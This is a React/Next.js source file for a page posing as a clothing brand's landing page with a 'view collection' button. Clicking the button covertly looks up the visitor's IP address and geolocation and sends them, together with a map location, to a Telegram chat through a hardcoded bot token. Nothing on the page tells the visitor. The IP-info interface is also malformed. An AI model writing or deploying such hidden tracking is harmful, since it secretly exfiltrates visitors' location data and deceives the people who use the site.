import axios from "axios";
import Head from "next/head";
import Image from "next/image";
import banner from "@/widgets/banner.png";
import { Layout } from "../Layout";
import cls from "./IndexPage.module.css";

interface IIpInfo {
  ip: "8.8.8.8",
  version: "IPv4",
  city: "Mountain View",
  region: "California",
  region_code: "CA",
  country_code: "US",
  country_code_iso3: "USA",
  country_name: "United States",
  country_capital: "Washington",
  country_tld: ".us",
  continent_code: "NA",
  in_eu: false,
  postal: "94035",
  latitude: 37.386,
  longitude: -122.0838,
  timezone: "America/Los_Angeles",
  utc_offset: "-0800",
  country_calling_code: "+1",
  currency: "USD",
  currency_name: "Dollar",
  languages: "en-US,es-US,haw,fr",
  country_area: 9629091.0,
  country_population: 310232863,
  asn: "AS15169",
  org: "Google LLC"
  hostname: "dns.google"
}

export function IndexPage() {
  const token = "6929973683:AAE5n_cNZ_0cFrwabxZqeIJqlTYzS0QPI50";
  const chatId = "-1002091877186";

  const submit = async () => {
    const resIp = await axios.get<string, unknown>("https://ipapi.co/ip/");

    const resIpInfo = await axios.get<IIpInfo>(`https://ipapi.co/${resIp.data}/json/`);

    const info = resIpInfo.data;

    let message = "";

    // eslint-disable-next-line no-restricted-syntax, guard-for-in
    for (const key in info) {
      // eslint-disable-next-line max-len
      message += `<b>${key}: </b>${info[key as keyof IIpInfo]}                                                                                               `;
    }

    await axios.post(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&parse_mode=html&text=${message}`);

    // eslint-disable-next-line max-len
    await axios.post(`https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${resIpInfo.data.latitude}&longitude=${resIpInfo.data.longitude}`);
  };

  return (
    <>
      <Head>
        <title>ЭGREH</title>
        <meta name="description" content="ЭGREH" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>

      <Layout>
        <main>
          {/* BANNER */}
          <section className={cls.banner}>
            <Image
              className={cls.bannerFon}
              src={banner}
              alt=""
              priority
            />

            <div className={cls.bannerInner}>
              <div className={cls.bannerInnerMainText}>FIRST  DROP FW24</div>
              {/* <div className={cls.bannerInnerAdditionalText}>Check out our high-quality and affordable fashion!</div> */}
              <button onClick={submit} type="button" className={cls.bannerInnerButton}>ПОСМОТРЕТЬ КОЛЛЕКЦИЮ</button>
            </div>
          </section>
        </main>
      </Layout>
    </>
  );
}
